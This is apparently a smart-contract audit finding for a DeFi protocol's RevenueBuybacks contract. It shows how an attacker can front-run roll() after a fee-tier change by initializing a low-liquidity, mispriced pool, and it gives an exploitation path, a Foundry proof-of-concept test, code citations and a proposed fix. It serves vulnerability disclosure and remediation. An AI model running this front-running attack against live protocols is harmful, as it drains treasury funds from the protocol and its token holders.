## Title
RevenueBuybacks Orders Can Be Redirected to Attacker-Controlled Pools with Zero/Minimal Liquidity via Fee Tier Manipulation

## Summary
The `RevenueBuybacks.configure()` function allows the owner to change fee tiers at any time without validating that a legitimate pool with adequate liquidity exists for the new fee tier. An attacker can front-run the subsequent `roll()` call by initializing a malicious pool with the new fee tier and minimal/zero liquidity, causing protocol revenue buyback orders to execute at extremely unfavorable prices.

## Impact
**Severity**: High

## Finding Description
**Location:** `src/RevenueBuybacks.sol` (function `configure` at lines 147-173, function `roll` at lines 90-139) [1](#0-0) [2](#0-1) 

**Intended Logic:** The `configure()` function is intended to allow the owner to set buyback parameters including the fee tier for the pool where revenue buyback orders will be executed. The system assumes a legitimate pool with adequate liquidity exists or will exist for the configured fee tier.

**Actual Logic:** When `configure()` changes the fee tier, there is no validation that a pool with the new fee tier exists or has adequate liquidity. The `roll()` function creates orders using the configured fee tier without any checks on pool liquidity or price. Since anyone can initialize pools via `Core.initializePool()`, an attacker can front-run `roll()` by creating a pool with the new fee tier and manipulated conditions. [3](#0-2) [4](#0-3) 

**Exploitation Path:**
1. **Owner action**: Owner calls `configure()` to change fee tier from X to Y for legitimate operational reasons
2. **Attacker observes**: Attacker monitors the mempool or on-chain transactions and sees the fee tier change
3. **Pool initialization front-run**: Before anyone calls `roll()`, attacker calls `Core.initializePool()` with parameters `(revenueToken, BUY_TOKEN, feeY, TWAMM_EXTENSION)` and a manipulated initial tick/price
4. **Minimal liquidity**: Attacker optionally adds minimal liquidity at the manipulated price via `Positions.updatePosition()`
5. **Order creation**: Anyone (or the attacker themselves) calls `RevenueBuybacks.roll()`, which creates a TWAMM order in the attacker's malicious pool
6. **Order execution**: The TWAMM order executes over time (potentially days/weeks) against zero or minimal liquidity at extremely unfavorable prices [5](#0-4) [6](#0-5) 

7. **Value extraction**: The attacker profits from fees as the sole LP and from price manipulation, while the protocol gets terrible execution for its buyback orders [7](#0-6) 

**Security Property Broken:** This violates the protocol's intended purpose of efficient revenue buyback and results in loss of protocol funds through forced poor execution.

## Impact Explanation
- **Affected Assets**: All protocol revenue tokens configured for buybacks in `RevenueBuybacks`
- **Damage Severity**: Protocol loses significant value on every buyback order executed in the manipulated pool. With zero liquidity, orders cannot execute properly. With minimal liquidity at manipulated prices, the protocol receives far less of the BUY_TOKEN than it should. The attacker captures value through LP fees and price manipulation. For a large revenue buyback (e.g., 100 ETH worth), losses could range from 10-90% depending on the liquidity manipulation.
- **User Impact**: While not directly affecting individual users, this drains protocol treasury/revenue that would otherwise benefit token holders or be used for protocol development. Every fee tier change is vulnerable to this attack.

## Likelihood Explanation
- **Attacker Profile**: Any external actor who can monitor transactions and has capital to initialize pools and add minimal liquidity (gas costs + minimal liquidity amounts, likely < 1 ETH total)
- **Preconditions**: 
  1. Owner changes fee tier via `configure()` to a tier where no pool exists yet for the (revenueToken, BUY_TOKEN, newFee, TWAMM) combination
  2. The attacker must front-run the first `roll()` call after the fee tier change
- **Execution Complexity**: Single transaction to initialize pool, optional second transaction to add minimal liquidity. Front-running is straightforward via mempool monitoring or flashbots.
- **Frequency**: Can be exploited every time the owner changes fee tiers to a new tier without an existing legitimate pool. This could happen multiple times as the protocol adjusts configurations or adds new revenue tokens.

## Recommendation

Add validation in `RevenueBuybacks.roll()` to check pool liquidity before creating orders: [3](#0-2) 

**Mitigation options:**

1. **Add minimum liquidity check**: Before creating an order, verify the pool has sufficient liquidity (e.g., minimum TVL threshold)

2. **Pre-initialize pools**: Have the owner initialize and seed pools with adequate liquidity before changing fee tiers via `configure()`

3. **Two-step configuration**: Implement a time-delay or two-step process for fee tier changes, allowing legitimate pools to be established first

4. **Whitelist pools**: Add a pool validation mechanism where only pre-approved pools can be used for buybacks

**Recommended fix:**
```solidity
// In src/RevenueBuybacks.sol, function roll(), before line 134:

// Add minimum liquidity validation
PoolKey memory poolKey = _createPoolKey(token, state.fee());
PoolState poolState = ICore(address(ORDERS.CORE())).poolState(poolKey.toPoolId());
if (!poolState.isInitialized()) {
    revert PoolNotInitialized();
}
if (poolState.liquidity() < MINIMUM_LIQUIDITY_THRESHOLD) {
    revert InsufficientPoolLiquidity();
}

// Then proceed with order creation
if (amountToSpend != 0) {
    saleRate = ORDERS.increaseSellAmount{value: isEth ? amountToSpend : 0}(
        NFT_ID, _createOrderKey(token, state.fee(), 0, endTime), uint128(amountToSpend), type(uint112).max
    );
}
```

## Proof of Concept
```solidity
// File: test/Exploit_RevenueBuybacksPoolManipulation.t.sol
// Run with: forge test --match-test test_RevenueBuybacksRedirectToMaliciousPool -vvv

pragma solidity ^0.8.31;

import {BaseOrdersTest} from "./Orders.t.sol";
import {RevenueBuybacks} from "../src/RevenueBuybacks.sol";
import {PoolKey} from "../src/types/poolKey.sol";
import {createFullRangePoolConfig} from "../src/types/poolConfig.sol";
import {MIN_TICK, MAX_TICK} from "../src/math/constants.sol";

contract Exploit_RevenueBuybacksPoolManipulation is BaseOrdersTest {
    RevenueBuybacks rb;
    
    function setUp() public override {
        BaseOrdersTest.setUp();
        rb = new RevenueBuybacks(address(this), orders, address(token1));
        rb.approveMax(address(token0));
    }
    
    function test_RevenueBuybacksRedirectToMaliciousPool() public {
        // SETUP: Configure with fee tier A, legitimate pool exists
        uint64 legitimateFee = uint64((uint256(1) << 64) / 100); // 1%
        rb.configure({
            token: address(token0),
            targetOrderDuration: 3600,
            minOrderDuration: 1800,
            fee: legitimateFee
        });
        
        // Legitimate pool with good liquidity
        PoolKey memory legitPoolKey = PoolKey({
            token0: address(token0),
            token1: address(token1),
            config: createFullRangePoolConfig({_extension: address(twamm), _fee: legitimateFee})
        });
        positions.maybeInitializePool(legitPoolKey, 0);
        token0.approve(address(positions), 100e18);
        token1.approve(address(positions), 100e18);
        positions.mintAndDeposit(legitPoolKey, MIN_TICK, MAX_TICK, 100e18, 100e18, 0);
        
        // EXPLOIT: Owner changes fee tier, attacker front-runs
        uint64 newFee = uint64((uint256(1) << 64) / 200); // 0.5% - different fee
        rb.configure({
            token: address(token0),
            targetOrderDuration: 3600,
            minOrderDuration: 1800,
            fee: newFee
        });
        
        // Attacker front-runs roll() by initializing malicious pool with minimal liquidity
        PoolKey memory maliciousPoolKey = PoolKey({
            token0: address(token0),
            token1: address(token1),
            config: createFullRangePoolConfig({_extension: address(twamm), _fee: newFee})
        });
        
        // Initialize at manipulated tick
        positions.maybeInitializePool(maliciousPoolKey, -100); // Manipulated price
        
        // Add only 0.01% of the liquidity compared to legitimate pool
        token0.approve(address(positions), 0.01e18);
        token1.approve(address(positions), 0.01e18);
        positions.mintAndDeposit(maliciousPoolKey, MIN_TICK, MAX_TICK, 0.01e18, 0.01e18, 0);
        
        // Donate revenue to buyback contract
        token0.transfer(address(rb), 10e18);
        
        // VERIFY: roll() creates order in malicious pool with minimal liquidity
        (uint64 endTime, uint112 saleRate) = rb.roll(address(token0));
        
        assertGt(saleRate, 0, "Order created");
        
        // The order is now stuck in the malicious pool with only 0.01e18 liquidity
        // vs legitimate pool with 100e18 liquidity
        // Protocol will get extremely poor execution over the order duration
        
        // Verify by checking the order executes in the low-liquidity pool
        vm.warp(block.timestamp + 1800); // halfway through order
        
        uint128 proceeds = rb.collect(address(token0), newFee, endTime);
        
        // Due to low liquidity, proceeds will be far less than expected
        // In a legitimate pool with 100x more liquidity, proceeds would be ~100x higher
        assertLt(proceeds, 0.1e18, "Extremely poor execution due to low liquidity");
    }
}
```

**Notes:**
This vulnerability is particularly severe because:
1. It directly results in loss of protocol funds through forced poor execution
2. The attack can be repeated whenever fee tiers are changed
3. The owner (trusted) has no way to prevent it without additional validation mechanisms
4. Orders are locked for their entire duration (potentially days/weeks) in the malicious pool
5. The "TWAMM execution price degradation due to low liquidity" known issue specifically excludes "lack of opposing orders" but this is about pool initialization attacks, not natural market conditions

### Citations

**File:** src/RevenueBuybacks.sol (L90-139)
```text
    function roll(address token) public returns (uint64 endTime, uint112 saleRate) {
        unchecked {
            BuybacksState state;
            assembly ("memory-safe") {
                state := sload(token)
            }

            if (!state.isConfigured()) {
                revert TokenNotConfigured(token);
            }

            // minOrderDuration == 0 indicates the token is not configured
            bool isEth = token == NATIVE_TOKEN_ADDRESS;
            uint256 amountToSpend = isEth ? address(this).balance : SafeTransferLib.balanceOf(token, address(this));

            uint32 timeRemaining = state.lastEndTime() - uint32(block.timestamp);
            // if the fee changed, or the amount of time exceeds the min order duration
            // note the time remaining can underflow if the last order has ended. in this case time remaining will be greater than min order duration,
            // but also greater than last order duration, so it will not be re-used.
            if (
                state.fee() == state.lastFee() && timeRemaining >= state.minOrderDuration()
                    && timeRemaining <= state.lastOrderDuration()
            ) {
                // handles overflow
                endTime = uint64(block.timestamp + timeRemaining);
            } else {
                endTime =
                    uint64(nextValidTime(block.timestamp, block.timestamp + uint256(state.targetOrderDuration()) - 1));

                state = createBuybacksState({
                    _targetOrderDuration: state.targetOrderDuration(),
                    _minOrderDuration: state.minOrderDuration(),
                    _fee: state.fee(),
                    _lastEndTime: uint32(endTime),
                    _lastOrderDuration: uint32(endTime - block.timestamp),
                    _lastFee: state.fee()
                });

                assembly ("memory-safe") {
                    sstore(token, state)
                }
            }

            if (amountToSpend != 0) {
                saleRate = ORDERS.increaseSellAmount{value: isEth ? amountToSpend : 0}(
                    NFT_ID, _createOrderKey(token, state.fee(), 0, endTime), uint128(amountToSpend), type(uint112).max
                );
            }
        }
    }
```

**File:** src/RevenueBuybacks.sol (L147-173)
```text
    function configure(address token, uint32 targetOrderDuration, uint32 minOrderDuration, uint64 fee)
        external
        onlyOwner
    {
        if (minOrderDuration > targetOrderDuration) revert MinOrderDurationGreaterThanTargetOrderDuration();
        if (minOrderDuration == 0 && targetOrderDuration != 0) {
            revert MinOrderDurationMustBeGreaterThanZero();
        }

        BuybacksState state;
        assembly ("memory-safe") {
            state := sload(token)
        }
        state = createBuybacksState({
            _targetOrderDuration: targetOrderDuration,
            _minOrderDuration: minOrderDuration,
            _fee: fee,
            _lastEndTime: state.lastEndTime(),
            _lastOrderDuration: state.lastOrderDuration(),
            _lastFee: state.lastFee()
        });
        assembly ("memory-safe") {
            sstore(token, state)
        }

        emit Configured(token, state);
    }
```

**File:** src/Core.sol (L72-101)
```text
    function initializePool(PoolKey memory poolKey, int32 tick) external returns (SqrtRatio sqrtRatio) {
        poolKey.validate();

        address extension = poolKey.config.extension();
        if (extension != address(0)) {
            StorageSlot isExtensionRegisteredSlot = CoreStorageLayout.isExtensionRegisteredSlot(extension);

            if (isExtensionRegisteredSlot.load() == bytes32(0)) {
                revert ExtensionNotRegistered();
            }

            IExtension(extension).maybeCallBeforeInitializePool(msg.sender, poolKey, tick);
        }

        PoolId poolId = poolKey.toPoolId();
        PoolState state = readPoolState(poolId);
        if (state.isInitialized()) revert PoolAlreadyInitialized();

        sqrtRatio = tickToSqrtRatio(tick);
        writePoolState(poolId, createPoolState({_sqrtRatio: sqrtRatio, _tick: tick, _liquidity: 0}));

        // initialize these slots so the first swap or deposit on the pool is the same cost as any other swap
        StorageSlot fplSlot0 = CoreStorageLayout.poolFeesPerLiquiditySlot(poolId);
        fplSlot0.store(bytes32(uint256(1)));
        fplSlot0.next().store(bytes32(uint256(1)));

        emit PoolInitialized(poolId, poolKey, tick, sqrtRatio);

        IExtension(extension).maybeCallAfterInitializePool(msg.sender, poolKey, tick, sqrtRatio);
    }
```

**File:** src/types/orderKey.sol (L55-60)
```text
function toPoolKey(OrderKey memory orderKey, address twamm) pure returns (PoolKey memory poolKey) {
    uint64 _fee = orderKey.config.fee();
    assembly ("memory-safe") {
        mcopy(poolKey, orderKey, 64)
        mstore(add(poolKey, 64), add(shl(96, twamm), shl(32, _fee)))
    }
```

**File:** src/extensions/TWAMM.sol (L210-212)
```text
                PoolKey memory poolKey = orderKey.toPoolKey(address(this));
                PoolId poolId = poolKey.toPoolId();
                _executeVirtualOrdersFromWithinLock(poolKey, poolId);
```

**File:** src/math/twamm.sol (L107-111)
```text
        if (c == 0 || liquidity == 0) {
            // if liquidity is 0, we just settle the ratio of sale rates since the liquidity provides no friction to the price movement
            // if c is 0, that means the difference b/t sale ratio and sqrt ratio is too small to be detected
            // so we just assume it settles at the sale ratio
            sqrtRatioNext = toSqrtRatio(sqrtSaleRatio, roundUp);
```
